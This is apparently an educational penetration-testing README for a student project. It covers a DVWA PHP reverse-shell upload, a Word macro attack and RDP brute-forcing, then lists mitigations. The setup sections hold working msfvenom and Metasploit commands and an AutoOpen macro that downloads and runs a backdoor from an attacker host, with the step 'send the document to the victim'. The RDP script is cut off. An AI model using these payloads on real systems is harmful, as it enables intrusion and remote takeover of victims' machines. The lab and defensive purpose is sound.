# Penetration Testing Insights: RDP, Macro Exploits, and PHP Shell Uploads  
*A practical guide to understanding common cybersecurity vulnerabilities and mitigation strategies.*

---

## 📌 Overview  
This project demonstrates three critical cybersecurity exploitation techniques:  
1. **PHP Backdoor via File Upload Vulnerabilities** (using DVWA).  
2. **Macro-Based Exploitation in MS-Office**.  
3. **RDP Exploitation in Windows 11**.  

It also provides actionable mitigation strategies to defend against these attacks.  

---

## 🛠️ Prerequisites  
- **Tools**:  
  - Kali Linux (for Metasploit, msfvenom).  
  - DVWA (Damn Vulnerable Web Application).  
  - Microsoft Office (for macro testing).  
  - Python 3 (for RDP brute-force script).  
- **Basic Knowledge**:  
  - Familiarity with command-line tools.  
  - Understanding of ethical hacking principles.  

---

## 🔧 Setup Instructions  

### 1. PHP File Upload Exploitation (DVWA)  
- **Step 1**: Install DVWA and set security level to *"Low"*.  
- **Step 2**: Generate a PHP reverse shell payload:  
  ```bash
  msfvenom -p php/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=8000 -f raw > shell.php
Step 3: Upload shell.php to DVWA.

Step 4: Start Metasploit handler:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; set LPORT 8000; exploit"
```
- **Step 5**: Execute the uploaded file in DVWA to gain a reverse shell.

### 2. Macro-Based Exploitation (MS-Office)
- **Step 1**: Generate a malicious payload:

```bash

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=6666 -f exe > backdoor.exe
```

- **Step 2**: Host the payload on a local server (e.g., python3 -m http.server 8000).

- **Step 3**: Create a Word macro to download and execute backdoor.exe:


```bash
Sub AutoOpen()
  Shell "powershell -c Invoke-WebRequest http://<YOUR_IP>:8000/backdoor.exe -OutFile %Temp%\backdoor.exe; Start-Process %Temp%\backdoor.exe"
End Sub
```

- **Step 4**: Start the Metasploit handler (similar to Step 4 above).

- **Step 5**: Send the document to the victim. When macros are enabled, the payload executes.

### 3. RDP Exploitation (Brute-Force Attack)
- **Step 1**: Create a Python script (rdp_brute.py) to brute-force credentials (see code snippet below).

- **Step 2**: Run the script:

```bash
python3 rdp_brute.py
```

# Sample RDP brute-force script (replace IP, usernames, passwords)
```python
import subprocess

def check_rdp(host, username, password):
    # ... (refer to Figure 3.3.1 in the report for full code)
🛡️ Mitigation Strategies
For PHP Uploads:
```

- Validate file types (extension + MIME type).

- Store files outside the web root.

- Disable PHP execution in upload directories.

 ### For Macros:

- Disable macros by default.

- Use trusted digital signatures.

- Enable Protected View.

### For RDP:

- Enforce Multi-Factor Authentication (MFA).

-  Restrict RDP access via VPN/firewall.

- Apply security patches (e.g., BlueKeep).

## 📚 References
OWASP File Upload Guidelines

Microsoft RDP Security Advisory

Metasploit Documentation

### ⚠️ Disclaimer
This project is for educational purposes only. Always obtain proper authorization before testing systems.

🙏 Acknowledgments
Special thanks to N.M.I Raisul Bari (Daffodil International University) for guidance.


---

**How to Use This README**:  
1. Replace `<YOUR_IP>` with your local IP (use `ifconfig` or `ipconfig`).  
2. Ensure all tools (DVWA, Metasploit) are properly installed.  
3. Follow ethical guidelines—do not test on unauthorized systems.
This response is AI-generated, for reference only.
